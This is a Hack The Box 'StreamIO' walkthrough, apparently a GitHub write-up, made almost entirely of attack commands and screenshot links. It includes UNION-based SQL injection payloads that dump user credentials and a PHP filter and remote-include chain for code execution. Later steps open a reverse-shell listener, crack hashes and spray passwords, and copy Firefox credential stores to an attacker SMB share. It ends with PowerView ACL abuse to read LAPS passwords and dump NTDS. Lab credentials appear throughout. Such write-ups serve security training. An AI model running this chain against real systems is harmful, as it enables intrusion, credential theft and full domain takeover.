```
http://streamio.htb/
http://watch.streamio.htb/
https://streamio.htb/
https://watch.streamio.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
https://watch.streamio.htb/search.php
https://book.hacktricks.xyz/pentesting-web/sql-injection
1' and 1=1 -- | 1' and 1=2 --
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
https://crackstation.net/
https://streamio.htb/login.php
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -fs 1678
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpL[SNIIIIIP]Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php
system("dir C:\\");
https://streamio.htb/admin/?debug=master.php
Content-Type: application/x-www-form-urlencoded
include=http://10.10.14.39/rce.php
rlwrap -cAr nc -lnvp 443
$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h’);
dir -recurse *.php | select-string -pattern "database"
where.exe sqlcmd
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;“
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
crackmapexec smb 10.10.11.158 -u users2.txt -p pass2.txt --continue-on-success --no-bruteforce
crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
upload winPEASx64.exe
./winPEASx64.exe
./smbserver.py s . -smb2support -username df -password df
cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
net use \\10.10.14.39\s /u:df df
copy key4.db \\10.10.14.39\s\key4.db
copy logins.json \\10.10.14.39\s\logins.json
git clone https://github.com/lclevy/firepwd.git
python3 firepwd.py
crackmapexec smb 10.10.11.158 -u users3.txt -p pass3.txt
crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
net group 'CORE STAFF'
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
```



```
nmap -sS -sC -sV -T5 -Pn 10.10.11.158
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1d9d63ec-98da-48dc-a9ca-8a36d393a754)


```
nano /etc/hosts
http://streamio.htb/
http://watch.streamio.htb/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4ad7db0f-8664-4569-acec-863ac85694aa)

![image](https://github.com/regarmulia/HTB/assets/33616880/fa2c28a7-e4ed-4c2c-b545-5501266e527d)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.158/FUZZ -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://watch.streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://watch.streamio.htb/aspnet_client/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bcb3c787-0be4-414a-aa4b-d13c7026594e)

![image](https://github.com/regarmulia/HTB/assets/33616880/a3ba0e61-0e94-417c-bf78-4c899acecd25)

![image](https://github.com/regarmulia/HTB/assets/33616880/35cf6102-f206-4d22-90d3-6edf6baf2d60)


```
https://streamio.htb/
https://watch.streamio.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/66c5d747-edd2-459f-8d30-2fb9c7fcca3c)

![image](https://github.com/regarmulia/HTB/assets/33616880/cd007a1f-02d6-4512-8748-83b07fc1ed83)

![image](https://github.com/regarmulia/HTB/assets/33616880/4174f3e6-495d-45cb-8866-3da580fbb696)

![image](https://github.com/regarmulia/HTB/assets/33616880/728745d7-1f84-4590-bc15-336161ae50a5)


```
https://watch.streamio.htb/search.php
```
![image](https://user-images.githubusercontent.com/33616880/231679168-05ee4b46-32aa-44b9-9dc0-acdac11c53bb.png)


```
https://book.hacktricks.xyz/pentesting-web/sql-injection
1' and 1=1 --
1' and 1=2 --
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7418e160-7e1b-4fcb-a758-5d17f2bbac78)

![image](https://github.com/regarmulia/HTB/assets/33616880/ab276d7c-1709-480d-aec3-98a35ba705cf)


```
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,(SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6 -- -
10' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```


![image](https://user-images.githubusercontent.com/33616880/231682312-5800f445-3c89-4aa3-8110-5de64c805117.png)
![image](https://user-images.githubusercontent.com/33616880/231682585-e0902d6b-7ac8-41c8-8a42-b7cd78fe1776.png)
![image](https://user-images.githubusercontent.com/33616880/231682816-1f5bd069-b658-41e1-8355-afecd16ba1b8.png)
![image](https://user-images.githubusercontent.com/33616880/231683062-e55c2a7f-0633-4bf9-b7d1-d1d76e48ba57.png)
![image](https://user-images.githubusercontent.com/33616880/231683260-9e522f56-bdb3-407f-86c4-7b7087301533.png)
![image](https://user-images.githubusercontent.com/33616880/231683518-ed431e05-ff5f-4803-811e-690220fd83e0.png)



![image](https://user-images.githubusercontent.com/33616880/231683958-c70902d2-5b01-42f5-8ff4-391b6e1921de.png)



https://streamio.htb/login.php
![image](https://user-images.githubusercontent.com/33616880/231684123-97a34f6f-ee6a-4801-9bff-0df23c33adbf.png)


yoshihide | 66boysandgirls..
![image](https://user-images.githubusercontent.com/33616880/231684191-deebb280-68bc-4a64-925e-27d2ae57c876.png)



![image](https://user-images.githubusercontent.com/33616880/231685199-5f8f77ea-2941-4e43-b790-ad255a05b590.png)



ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -fs 1678
![image](https://user-images.githubusercontent.com/33616880/231685748-72927c4a-a4d4-4c78-b3cd-1f1b79687378.png)


![image](https://user-images.githubusercontent.com/33616880/231685826-403dd7d3-9fbf-4633-9a0d-eadc14d8a6bd.png)



ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
![image](https://user-images.githubusercontent.com/33616880/231685928-48a47caa-43a2-4427-bf94-e1b796dd2339.png)


![image](https://user-images.githubusercontent.com/33616880/231686014-782672f5-2cd5-4701-ae65-e2c0a17b50a7.png)


```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpL[SNIIIIIP]Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fd555a28-d715-4054-aec9-d71b2ccb97e0)

![image](https://github.com/regarmulia/HTB/assets/33616880/ef685788-d182-4b4e-8988-ab10073e345a)


```
system("dir C:\\");
https://streamio.htb/admin/?debug=master.php
Content-Type: application/x-www-form-urlencoded
include=http://10.10.14.39/rce.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/e734346e-828d-42ac-acbe-8301d121f68d)

![image](https://github.com/regarmulia/HTB/assets/33616880/419ea432-7684-4c04-825d-99f9b08bf57d)

![image](https://github.com/regarmulia/HTB/assets/33616880/d28f9d3c-3f78-4250-9f36-94073268c901)


```
rlwrap -cAr nc -lnvp 443
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7a536fc7-dd48-48aa-912b-f35f9306b243)

![image](https://github.com/regarmulia/HTB/assets/33616880/c62978fa-b9f5-456f-94e6-820969a459de)

![image](https://github.com/regarmulia/HTB/assets/33616880/3bae563b-ab72-4c7b-98e7-909c777c9eb9)


```
$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h’);
dir -recurse *.php | select-string -pattern "database"
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ca279069-7ef6-4bca-a83e-b82202e8242a)

![image](https://github.com/regarmulia/HTB/assets/33616880/ede2f053-a9c5-41c2-b1e1-e03c45ee34e2)


```
where.exe sqlcmd
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;“
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```
![image](https://github.com/regarmulia/HTB/assets/33616880/00842f4d-19a9-4136-ac87-0324c027facc)


```
hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
```
![image](https://github.com/regarmulia/HTB/assets/33616880/df33cfcb-58d1-49f1-9693-80ebc98060c1)

![image](https://github.com/regarmulia/HTB/assets/33616880/643e2a3d-9228-418e-85a9-196f928222d4)


```
crackmapexec smb 10.10.11.158 -u users2.txt -p pass2.txt --continue-on-success --no-bruteforce
crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/94348f00-aa7a-491f-8b27-f3c9968f603c)

![image](https://github.com/regarmulia/HTB/assets/33616880/36eeeecf-6b91-4d35-8485-602a4c2c4292)

```
evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
Get-ComputerInfo
```
![image](https://user-images.githubusercontent.com/33616880/231686295-621f2f18-be32-4e7e-90af-b0dada0b1254.png)

![image](https://github.com/regarmulia/HTB/assets/33616880/c9c20970-b530-423f-b821-8cea36faca5e)


https://github.com/carlospolop/PEASS-ng/releases
```
upload winPEASx64.exe
./winPEASx64.exe
```
![image](https://user-images.githubusercontent.com/33616880/231686514-0c6ced70-5cf4-48e3-8951-6b9ba81b18e0.png)
![image](https://user-images.githubusercontent.com/33616880/231686548-aa5a6439-c37c-4f74-a300-568f7ac4193a.png)
![image](https://user-images.githubusercontent.com/33616880/231686573-5ded1f6d-582b-41dd-adbd-30e8fa3f7b43.png)


```
./smbserver.py s . -smb2support -username df -password df
cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
net use \\10.10.14.39\s /u:df df
copy key4.db \\10.10.14.39\s\key4.db
copy logins.json \\10.10.14.39\s\logins.json
```
![image](https://github.com/regarmulia/HTB/assets/33616880/aaf0389b-152c-47c6-b62d-9c679b0e404f)

![image](https://github.com/regarmulia/HTB/assets/33616880/53696ae6-22b4-4e12-8b05-8a600ec7fe8e)


```
git clone https://github.com/lclevy/firepwd.git
python3 firepwd.py
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bef22052-e930-4afc-94b6-3f4e5e765fc8)

![image](https://github.com/regarmulia/HTB/assets/33616880/48c0cfca-63ec-4c03-aaf4-612913049f50)


```
crackmapexec smb 10.10.11.158 -u users3.txt -p pass3.txt
crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0af2564b-a418-496f-8a11-bda32d2a5eb0)

![image](https://github.com/regarmulia/HTB/assets/33616880/6956b962-0e9c-474d-8574-5cffe479247b)


```
PART 1
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
```
![image](https://user-images.githubusercontent.com/33616880/231689414-7ac352c9-8c51-4649-969a-1245d1e8da01.png)

```
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
```
![image](https://user-images.githubusercontent.com/33616880/231689571-2822ed95-a439-4a13-bd6d-ecf916b1e419.png)

![image](https://user-images.githubusercontent.com/33616880/231689606-cd64e06c-6078-48de-a790-ecdcf6537b66.png)


```
PART 2
neo4j console
bloodhound ; neo4j duk
git clone https://github.com/dirkjanm/BloodHound.py.git
cd BloodHound.py/
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -c All
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6aba8c3f-b554-4501-b4cd-239fa8f43917)

![image](https://github.com/regarmulia/HTB/assets/33616880/7751437d-cf2e-464d-94b7-bd91a2ca7c13)

![image](https://github.com/regarmulia/HTB/assets/33616880/e1cff478-0040-41fb-9871-dc9581392161)

![image](https://github.com/regarmulia/HTB/assets/33616880/af2b20e1-3f57-4912-9ac5-126378de801e)


```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
```
![image](https://user-images.githubusercontent.com/33616880/231689707-f1d88d6e-c3cf-405a-8b91-7a4fe11edabf.png)



```
. .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
net group 'CORE STAFF'
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

![image](https://user-images.githubusercontent.com/33616880/231689882-e7a2ef35-a3d0-4aa9-8f7f-2aa99b63203c.png)


```
crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d03dba37-db5c-47d9-8038-a0f160fd34fa)


```
crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/cfe6f588-336c-4e66-aed7-ddb09f10b1d1)

![image](https://github.com/regarmulia/HTB/assets/33616880/2fc7ee06-1e7e-4434-ad07-5ecf7c8ddca3)
